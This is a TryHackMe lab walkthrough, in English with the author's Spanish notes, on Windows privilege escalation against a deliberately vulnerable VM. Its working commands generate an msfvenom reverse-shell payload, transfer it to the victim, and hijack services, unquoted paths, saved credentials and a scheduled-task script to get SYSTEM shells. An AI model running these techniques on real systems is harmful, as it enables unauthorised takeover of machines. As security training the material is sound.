# Windows Privilege Escalation Room

This room is aimed at walking you through a variety of Windows Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Windows VM. This VM was created by Sagi Shahar as part of his local privilege escalation workshop but has been updated by Tib3rius as part of his *Windows Privilege Escalation for OSCP and Beyond!* course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Windows.

## Prerequisites

Make sure you are connected to the TryHackMe VPN or using the in-browser Kali instance before trying to access the Windows VM!

## Connecting to the Windows VM

RDP should be available on port **3389** (it may take a few minutes for the service to start). You can log in to the **user** account using the following credentials:

```bash
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.135.112
```

## Generate a Reverse Shell Executable

The next tasks will walk you through different privilege escalation techniques. After each technique, you should obtain an **admin** or **SYSTEM** shell. Remember to exit out of the shell and/or re-establish a session as the **user** account before starting the next task!

### Generating and Transferring a Reverse Shell Executable

1. On Kali, generate a reverse shell executable (`reverse.exe`) using `msfvenom`. Update the `LHOST` IP address accordingly:

   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
   ```

2. Transfer the `reverse.exe` file to the `C:\PrivEsc` directory on Windows. The simplest way to do this is by starting an SMB server on Kali and using the Windows copy command.

   - On Kali, in the same directory as `reverse.exe`:

     ```bash
     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
     ```

   - On Windows (update the IP address with your Kali IP):

     ```cmd
     copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
     ```

3. Test the reverse shell by setting up a netcat listener on Kali:

   ```bash
   sudo nc -nvlp 53
   ```

4. Then run the `reverse.exe` executable on Windows and catch the shell:

   ```cmd
   C:\PrivEsc\reverse.exe
   ```

The `reverse.exe` executable will be used in many of the tasks in this room, so **do not delete it**!

# Service Exploits - Insecure Service Permissions

## Checking Permissions
Use `accesschk.exe` to check the "user" account's permissions on the "daclsvc" service:

```cmd
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

Note that the "user" account has the permission to change the service config (`SERVICE_CHANGE_CONFIG`).

## Querying the Service
Query the service and note that it runs with SYSTEM privileges (`SERVICE_START_NAME`):

```cmd
sc qc daclsvc
```

## Modifying the Service Configuration
Modify the service config and set the `BINARY_PATH_NAME` (binpath) to the `reverse.exe` executable you created:

```cmd
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

## Executing the Exploit
1. Start a listener on Kali.
2. Start the service to spawn a reverse shell running with SYSTEM privileges:

```cmd
net start daclsvc
```

# Escalada de Privilegios mediante Manipulación de Servicio en Windows

## 📌 Descripción
Este documento describe el proceso de escalada de privilegios en Windows mediante la manipulación del binario de un servicio (`daclsvc`). Se ha aprovechado una configuración insegura que permite modificar el ejecutable del servicio, sustituyéndolo por un shell reverso.

---

## 🔍 1. Verificación de permisos sobre el servicio

```powershell
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```
- Se usa `accesschk.exe` (de Sysinternals) para comprobar los permisos que tiene el usuario `user` sobre el servicio `daclsvc`.
- Si `user` tiene permisos de modificación sobre el binario, es posible reemplazarlo con un ejecutable malicioso.

---

## 🔍 2. Consulta de configuración del servicio

```powershell
sc qc daclsvc
```
- `sc qc` (`query config`) muestra la configuración del servicio, incluyendo:
  - Ruta del binario (`BINARY_PATH_NAME`).
  - Permisos y configuración del servicio.

---

## 💻 3. Creación de un payload malicioso (shell reverso)

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.126.48 LPORT=53 -f exe -o reverse.exe
```
- **`msfvenom`** genera un payload de shell reverso en formato ejecutable.
- **Parámetros:**
  - `-p windows/x64/shell_reverse_tcp`: Payload de shell reverso para Windows x64.
  - `LHOST=10.11.126.48 LPORT=53`: Define la IP y puerto donde la víctima se conectará.
  - `-f exe -o reverse.exe`: Genera un ejecutable llamado `reverse.exe`.

---

## 🚀 4. Servir el payload a la víctima

```powershell
python3 -m http.server 8080
```
- Se inicia un servidor HTTP en el puerto **8080** para facilitar la descarga del payload en la máquina víctima.

---

## 📥 5. Descargar el payload en la máquina víctima

```powershell
curl -O http://10.11.126.48:8080/reverse.exe
```
- Se usa `curl` para descargar el archivo `reverse.exe` en la máquina víctima.

---

## 🔍 6. Verificar nuevamente la configuración del servicio

```powershell
sc qc daclsvc
```
- Se consulta nuevamente la configuración del servicio `daclsvc`, asegurándose de que se puede modificar su binario.

---

## ⚙️ 7. Modificar el servicio para ejecutar el payload

```powershell
sc config daclsvc binpath= "\"C:\Users\user\reverse.exe\""
```
- Se cambia la ruta del binario del servicio para que ejecute `reverse.exe` en lugar del ejecutable original.

---

## 🎧 8. Escuchar conexiones entrantes con Netcat

```powershell
nc -lvnp 53
```
- Se inicia **Netcat** en modo escucha (`-lvnp`).
- **Puerto 53** es usado para recibir la conexión de la shell reversa.

---

## 🔥 9. Iniciar el servicio modificado

```powershell
net start daclsvc
```
- Se inicia `daclsvc`, lo que ahora ejecuta `reverse.exe`.
- Esto lanza la shell reversa y se obtiene acceso remoto a la máquina víctima.

---

  
## Exploiting Unquoted Service Path

### Querying the Service
Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (`SERVICE_START_NAME`) and that the `BINARY_PATH_NAME` is unquoted and contains spaces:

```cmd
sc qc unquotedsvc
```

### Checking Permissions
Using `accesschk.exe`, check that the `BUILTIN\Users` group is allowed to write to the `C:\Program Files\Unquoted Path Service\` directory:

```cmd
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

### Exploiting the Service
Copy the `reverse.exe` executable to this directory and rename it as `Common.exe`:

```cmd
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

### Executing the Exploit
1. Start a listener on Kali.
2. Start the service to spawn a reverse shell running with SYSTEM privileges:

```cmd
net start unquotedsvc
```

# Explotación de Unquoted Service Path en Windows

## 📌 Descripción
Este documento detalla el proceso de explotación de una vulnerabilidad de **Unquoted Service Path** en Windows, permitiendo la ejecución de un binario malicioso al iniciarse un servicio con una ruta sin comillas.

---

## 🔍 1. Verificación de configuración de los servicios

```powershell
sc qc unquotedsvc
```
- Se consulta la configuración del servicio `unquotedsvc`.
- **No tiene comillas en `BINARY_PATH_NAME`**, lo que indica una posible vulnerabilidad de **Unquoted Service Path**.

```powershell
sc qc filepermsvc
```
- Se consulta la configuración del servicio `filepermsvc`.
- **Este servicio tiene comillas**, lo que significa que no es vulnerable a este ataque.

---

## 🔍 2. Verificación de permisos sobre un servicio

```powershell
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```
- **`accesschk.exe`** se usa para verificar los permisos del usuario sobre el binario del servicio.
- Si el usuario tiene permisos de escritura en la ruta, puede reemplazar el ejecutable con uno malicioso.

---

## 💻 3. Aprovechar Unquoted Service Path

```powershell
copy C:\Users\user\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
- Se copia el **payload malicioso (`reverse.exe`)** a una ruta sin comillas dentro de `Program Files`.
- Windows buscará **el ejecutable en cada espacio en blanco** cuando el servicio se inicie, ejecutando `Common.exe` en lugar del binario original.

---

## 🔍 4. Verificar la configuración del servicio

```powershell
sc qc unquotedsvc
```
- Se vuelve a revisar la configuración del servicio para confirmar que **no tiene comillas en su ruta**.
- Esto significa que, al iniciar el servicio, **Windows podría ejecutar el payload malicioso en `C:\Program Files\Unquoted Path Service\Common.exe` en lugar del binario legítimo**.

---

## 🎧 5. Escuchar conexiones entrantes con Netcat

```powershell
nc -lvnp 53
```
- Se inicia **Netcat** en modo escucha (`-lvnp`).
- **Puerto 53** es usado para recibir la conexión de la shell reversa.

---

## 🔥 6. Iniciar el servicio para ejecutar el payload

```powershell
net start unquotedsvc
```
- Se inicia `unquotedsvc`, lo que provoca que **Windows ejecute `Common.exe` (el payload malicioso)** debido a la vulnerabilidad de **Unquoted Service Path**.
- Esto lanza la shell reversa y otorga acceso remoto a la máquina víctima.

---

## Passwords - Saved Creds

### Listing Saved Credentials
List any saved credentials:

```cmd
cmdkey /list
```

Note that credentials for the "admin" user are saved. If they aren't, run the following script to refresh the saved credentials:

```cmd
C:\PrivEsc\savecred.bat
```

### Using Saved Credentials to Execute a Reverse Shell
Start a listener on Kali and run the `reverse.exe` executable using `runas` with the admin user's saved credentials:

```cmd
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

# Explotación de Credenciales Guardadas con `runas /savecred`

## 📌 Descripción
Este documento explica cómo explotar credenciales guardadas en Windows utilizando `cmdkey` y `runas /savecred` para ejecutar un binario malicioso con privilegios elevados.

---

## 🔍 1. Listar credenciales guardadas

```powershell
cmdkey /list
```
- Se usa `cmdkey` para ver las credenciales almacenadas en el sistema.
- Si las credenciales del usuario **admin** están guardadas, es posible usarlas sin necesidad de ingresar la contraseña.

---

## 🛠 2. Asegurar que las credenciales están disponibles

```powershell
C:\PrivEsc\savecred.bat
```
- Si las credenciales de `admin` no están almacenadas, se ejecuta el script `savecred.bat` para guardarlas nuevamente en el sistema.

---

## 💻 3. Ejecutar el payload con `runas /savecred`

```powershell
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```
- **`runas /savecred`** ejecuta un programa con las credenciales guardadas, sin pedir la contraseña.
- **Ejecuta `reverse.exe` con privilegios de `admin`**, logrando una escalada de privilegios si `reverse.exe` es un payload malicioso.
- **El archivo `reverse.exe` debe estar en `C:\PrivEsc\`**, ya que `runas` lo ejecutará desde esa ubicación.

---

## Scheduled Tasks

### Viewing the Script
View the contents of the `C:\DevTools\CleanUp.ps1` script:

```cmd
type C:\DevTools\CleanUp.ps1
```

The script seems to be running as SYSTEM every minute. Using `accesschk.exe`, check if you have the ability to write to this file:

```cmd
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

### Exploiting the Scheduled Task
Start a listener on Kali and then append a line to `C:\DevTools\CleanUp.ps1` which runs the `reverse.exe` executable:

```cmd
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.

# Explotación de Permisos en Scripts de PowerShell (`.ps1`)

## 📌 Descripción
Este documento describe cómo explotar permisos inseguros en un script de PowerShell (`CleanUp.ps1`) para ejecutar código malicioso y obtener una shell reversa.

---

## 🔍 1. Ver el contenido del script

```powershell
type C:\DevTools\CleanUp.ps1
```
- Se revisa el contenido del script `CleanUp.ps1` para entender su propósito.
- Si este script se ejecuta con privilegios elevados y **tiene permisos de escritura**, podemos modificarlo para ejecutar código malicioso.

---

## 🔍 2. Verificar permisos sobre el script

```powershell
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```
- **`accesschk.exe`** se usa para comprobar si el usuario tiene permisos de escritura sobre el script.
- Si el usuario **puede modificar el script**, entonces es vulnerable a una escalada de privilegios.

---

## 🎧 3. Escuchar conexiones entrantes con Netcat

```powershell
nc -lvnp 8888
```
- Se inicia **Netcat** en modo escucha (`-lvnp`).
- **Puerto 8888** es usado para recibir la conexión de la shell reversa.

---

## 💻 4. Inyectar el payload en el script

```powershell
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```
- Se agrega la ejecución de `reverse.exe` al script `CleanUp.ps1`.
- **Cuando el script sea ejecutado**, `reverse.exe` también se ejecutará, estableciendo una shell reversa.

---




   
